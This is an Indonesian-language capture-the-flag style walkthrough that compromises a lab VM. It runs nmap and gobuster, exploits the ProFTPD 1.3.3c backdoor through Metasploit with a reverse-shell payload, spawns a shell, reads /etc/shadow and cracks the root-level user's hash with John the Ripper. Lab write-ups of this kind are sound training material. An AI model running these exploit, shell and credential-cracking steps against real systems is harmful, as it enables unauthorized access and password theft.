Target 192.168.1.9

Lanjut Scan dengan Nmap

nmap -sV -sC 192.168.1.9
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-03 23:30 EDT
Nmap scan report for 192.168.1.9
Host is up (0.010s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
|   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
|_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

===================================================================
lakukan dir search dan kita dapatkan sesuatu dir rahasia


gobuster dir -u http://192.168.1.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.9
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/09/03 23:46:48 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 177]
/secret               (Status: 301) [Size: 311] [--> http://192.168.1.9/secret/]
Progress: 107632 / 882244 (12.20%)                                             ^C
[!] Keyboard interrupt detected, terminating.
                                                                                
===============================================================
2022/09/03 23:48:18 Finished
===============================================================

buat dalam DNS dalam Host kali linux kita    yaitu vtsec dengan cara sudo nano /etc/hosts/
lakukan konfigurasi DNS di dalam host


sekarang kita melihat bahwa FTP memiliki VULN ProFTPD 1.3.3c

dan kita cari searchploit ada code shell execution yang bisa di gunakan


dan kita mengunkan exploit

gunakan payload ProFTPD 1.3.3c

exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02  

set rhost 192.168.1.9 (IP target)

lalu cari payload

show payload

PAYLOAD = set payload cmd/unix/reverse

exploit


python -c 'import os; os.system("/bin/sh")'

shell


cat /etc/shadow


marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::


itu adalah  user dan password  root  yang telah ter encript

kita gunakan jhon untuk encript
john pent.txt 
Created directory: /home/scudent/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
marlinspike      (marlinspike)     
1g 0:00:00:00 DONE 1/3 (2022-09-04 00:45) 25.00g/s 200.0p/s 200.0c/s 200.0C/s marlinspike..marlin
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

marlinspike      (marlinspike)     

DONE !!!!!!





